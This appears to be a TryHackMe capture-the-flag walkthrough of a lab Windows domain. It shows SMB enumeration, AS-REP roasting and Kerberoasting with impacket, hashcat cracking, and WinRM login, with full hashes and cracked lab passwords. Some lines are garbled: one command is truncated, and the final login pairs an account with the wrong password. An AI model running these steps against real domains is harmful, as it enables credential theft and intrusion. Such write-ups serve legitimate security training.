So as always first of all we did a `rustscan` scan to know the open ports and network check

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-04-11 13:03:57Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49800/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 60320/tcp): CLEAN (Timeout)
|   Check 2 (port 39986/tcp): CLEAN (Timeout)
|   Check 3 (port 43436/udp): CLEAN (Timeout)
|   Check 4 (port 9255/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -1s
| smb2-time:
|   date: 2026-04-11T13:04:48
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

Okay so I think we should try to find any open `smb` shares on the Server

As we have found the domain we should change the IP to domain in our `/etc/hosts`

```bash
<target ip>    vulnnet-rst.local
```

With `smbclient`

```bash
└─$ smbclient -L //10.49.169.203 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.49.169.203 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

With `enum4linux`

```bash =================================( Share Enumeration on 10.49.169.203 )=================================

do_connect: Connection to 10.49.169.203 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.49.169.203

//10.49.169.203/ADMIN$  Mapping: DENIED Listing: N/A Writing: N/A
//10.49.169.203/C$      Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_NO_SUCH_FILE listing \*
//10.49.169.203/IPC$    Mapping: N/A Listing: N/A Writing: N/A
//10.49.169.203/NETLOGON        Mapping: OK Listing: DENIED Writing: N/A
//10.49.169.203/SYSVOL  Mapping: OK Listing: DENIED Writing: N/A
//10.49.169.203/VulnNet-Business-Anonymous      Mapping: OK Listing: OK Writing: N/A
//10.49.169.203/VulnNet-Enterprise-Anonymous    Mapping: OK Listing: OK Writing: N/A

```

We got this

```bash
└─$ smbclient //10.49.169.203/VulnNet-Enterprise-Anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4498529 blocks available

```

few text files with containing the following:

```plain
VULNNET OPERATIONS
~~~~~~~~~~~~~~~~~~~~

We bring predictability and consistency to your process. Making it repetitive doesn’t make it boring.
Set the direction, define roles, and rely on automation to keep reps focused and make onboarding a breeze.
Don't wait for an opportunity to knock - build the door. Contact us right now.
VulnNet Entertainment is fully commited to growth, security and improvement.
Make a right decision!

~VulnNet Entertainment
~TryHackMe


VULNNET SAFETY
~~~~~~~~~~~~~~~~

Tony Skid is a core security manager and takes care of internal infrastructure.
We keep your data safe and private. When it comes to protecting your private information...
we’ve got it locked down tighter than Alcatraz.
We partner with TryHackMe, use 128-bit SSL encryption, and create daily backups.
And we never, EVER disclose any data to third-parties without your permission.
Rest easy, nothing’s getting out of here alive.

~VulnNet Entertainment
~TryHackMe


VULNNET SYNC
~~~~~~~~~~~~~~

Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.
Proposals are just one part of your agency sales process. We tie together your other software, so you can import contacts from your CRM,
auto create deals and generate invoices in your accounting software. We are regularly adding new integrations.
Say no more to desync problems.
To contact our sync manager call this number: 7331 0000 1337

~VulnNet Entertainment
~TryHackMe
```

And for the business one

```bash
└─$ smbclient //10.49.169.203/VulnNet-Business-Anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4498526 blocks available
```

We got this

```plain
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her.
We understand that when you’ve got questions, especially when you’re on a tight proposal deadline, you NEED answers.
Our customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.
We’re here to help, regardless of which you plan you’re on or if you’re just taking us for a test drive.
Our company looks forward to all of the business proposals, we will do our best to evaluate all of your offers properly.
To contact our core business manager call this number: 1337 0000 7331

~VulnNet Entertainment
~TryHackMe
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Jack Goldenhand is the person you should reach to for any business unrelated proposals.
Managing proposals is a breeze with VulnNet. We save all your case studies, fees, images and team bios all in one central library.
Tag them, search them and drop them into your layout. Proposals just got... dare we say... fun?
No more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).
Your client gets a branded, interactive proposal they can sign off electronically. No need for extra software or logins.
Oh, and we tell you as soon as your client opens it.

~VulnNet Entertainment
~TryHackMe
VULNNET TRACKING
~~~~~~~~~~~~~~~~~~

Keep a pulse on your sales pipeline of your agency. We let you know your close rate,
which sections of your proposals get viewed and for how long,
and all kinds of insight into what goes into your most successful proposals so you can sell smarter.
We keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome.
You won't miss anything ever again.

~VulnNet Entertainment
~TryHackMe

```

So from the above `info.` we got many usernames which can be used in the following enumeration.

```plain
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

Let's try to find which account can be accessed without any pre-identification on kerberos

```bash
└─$ impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -no-pass -dc-ip 10.49.169.203
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:67cf2b2dce8a11bb417fdfcd12d065e8$ee31263de412da8cb9722b26aa20a97d789579ff14c4449fba28bbc425c86c36ec3dd99fd82e65d35f84240dd63fa5b9037d502dd2f6d59fbe2638b0287669fc5a127d99db98405676a783f4526ad9bd6f43e11952a030da73ca7b15b87e1b69e26b9c776f1106b87f7c06195a3293d332adfa30a546df0cb164f4316b91bd175daf94c83456688357b829658dd8be9e5d5c23d327ea535c71bd934343f4f0fa17a494efb38b3bee673ab421f0f50a49cf28c565564b20011b7f0297e2277eb39d152dcd7a4fee53c1d7ddd9c0bf80074639b54ebde29810797a9719fe8f39071251b0666c9e028d89a96b8883b88ab0348c1d50e1bc
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set

```

And we can see that user `t-skid` have don't require pre-authentication flag set as true so let's try to crack that hash and get into his system.

To crack the hash we need to find the type of the hash and what attack type has it on hashcat
(It's obviously `kerberos` but just to check I mean why not!!)

```bash
└─$ haiti '$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:67cf2b2dce8a11bb417fdfcd12d065e8$ee31263de412da8cb9722b26aa20a97d789579ff14c4449fba28bbc425c86c36ec3dd99fd82e65d35f84240dd63fa5b9037d502dd2f6d59fbe2638b0287669fc5a127d99db98405676a783f4526ad9bd6f43e11952a030da73ca7b15b87e1b69e26b9c776f1106b87f7c06195a3293d332adfa30a546df0cb164f4316b91bd175daf94c83456688357b829658dd8be9e5d5c23d327ea535c71bd934343f4f0fa17a494efb38b3bee673ab421f0f50a49cf28c565564b20011b7f0297e2277eb39d152dcd7a4fee53c1d7ddd9c0bf80074639b54ebde29810797a9719fe8f39071251b0666c9e028d89a96b8883b88ab0348c1d50e1bc'
Kerberos 5 AS-REP etype 23 [HC: 18200] [JtR: krb5asrep]
```

So we can try to un-hash it using HC attack mode 18200 with our famous `rockyou.txt`

Here's the result >

```bash
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:67cf2b2dce8a...50e1b
```

```bash
└─$ cat t-skid.cracked
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:67cf2b2dce8a11bb417fdfcd12d065e8$ee31263de412da8cb9722b26aa20a97d789579ff14c4449fba28bbc425c86c36ec3dd99fd82e65d35f84240dd63fa5b9037d502dd2f6d59fbe2638b0287669fc5a127d99db98405676a783f4526ad9bd6f43e11952a030da73ca7b15b87e1b69e26b9c776f1106b87f7c06195a3293d332adfa30a546df0cb164f4316b91bd175daf94c83456688357b829658dd8be9e5d5c23d327ea535c71bd934343f4f0fa17a494efb38b3bee673ab421f0f50a49cf28c565564b20011b7f0297e2277eb39d152dcd7a4fee53c1d7ddd9c0bf80074639b54ebde29810797a9719fe8f39071251b0666c9e028d89a96b8883b88ab0348c1d50e1bc:tj072889*
```

```
vulnnet-rst.local/t-skid:tj072889* -dc-ip 10.49.169.203 -request
```

TGS hash

```bash
└─$ echo '$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$6abf4cc44a39bdcd4105132ce2de79e2$94ceaec59d8fd2d6fc7e78163f5dec76f9d3d7d36f3ba72611c13023d17b1f58beb790bd1b8059235768103a637044b078084ccec
48d415bf4c663bfd149f30f83e0478dbfa3c9533bca86bdb904fc8241fa66afd97f377c5e2e0113db73e2717435076243a9474c8b417b888d0de8eaa945119c9fa3613391b3ecf4226c1e94daadaa14dadfc3aae24047f1a828ef853322cec2b40afc43afc0f17832512ac671575525e95af19c1a7fa
e625f1c1be49caa84f927c84a39464387cb448caa738a75ac31a2c29f912faeaefa2091daf9182eb8551f06dc5160df89dd445e9c74127070827233af07d58df6a759727ccef8b8acb9982af7857d262f768dc330e4eea21e9e1c575ba90a7dca7d4be17fdc8c1c1c9d3603d877b022887e483f63538
f5b794d32c4e7708fa8ed8b35e2aae0fd0f762acd690d44be1b142507142fa654aeda87906bdfc8ba6b81dbe6dc1be8d1331ea178e3a5f739eb2eb35207f946c91471e7a75c11616029b85d36ad2ed9c6135090bcb32416b81da0305bfa9c8a905c29a6ca3759ede8f96f18be22652d287b64ce6d744
7b75d63136511c913930b9e1962cede06fde63001a7b70e3d16909a429a73c30f5e751c99c1d17a4521ac5aa1eaffa6746de8accb8312996689b86cfb94a898d066602e68512f865229511549eb30dbac994b543e1977b9105d19e0fef3982c4d7a71ae86d69429c9c19f2f330140cdf30e5231a8253
7626879950f988a074572c9273b2117c0c4497cab2f97b72aef6ef05658b9968bfffb91c21a7245e1a3b80f40f7177acd5d1062bc62d21c2874f62bd3cb4e48226037941c354a0017cec4434de5ccfd0791eed3fd4ed20f8e64c4b702bbb32526cf110e9f62a77c51d7f0607b9634b6b468fd864de6e
440ae88d00b6c0381f1df8d17c53493ac66234e0f2195f83883e0bd015e0e26d324881c8674cdc7cf5e9c8ae72a95ff1fc72ddb4a14bbea1cd378c234350c97b638cd2e048f0b6c90df243d0fb3f9837d7baab629be6e6151a2c5bb366efb672b13884d071be58233768f4bf37bab374691af67cf0de
44b92a182f5676e41ec44c56bb69419205523aad19cc9e5eae7401bebb2d694314d6118ef0fafde6c44c9e92c590e897bd8788cff0cf5b2184bcb284a7b78be8800fc46274296c1824c6a83da9f4e50f5f7f678a732d6ba3a55e14cad912ca53aa25eb9f3f327a1d4c22dccf26f37b9cc221fae2f36e
3eba0722cf07570384fcb721b6762e6c7603ac0861755a59e5e52e2714fc0d9270e88e7c9629db8ae7027f8b23c0650d725d4153b5eb32395f1f56afad711bf691740ff5b554648a0553d2c66474b53129f7f26a581c4f339bb079f7770c5c3ced0f3f4615f3a535b81e26c26f385' > tgs_hash_fo
r_enterprise
```

Let's unhash it

```bash
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$v...26f385
```

```plain
<hash>:ry=ibfkfv,s6h,
```

Now since we have t-skids password let's try to use `smbclient` to get into their system

```bash
smbclient -U t-skid \\\\10.49.169.203\\NETLOGON
```

```shell
evil-winrm -u 'enterprise-core-vn' -p 'tj072889*' -i 10.49.169.203 -N
```
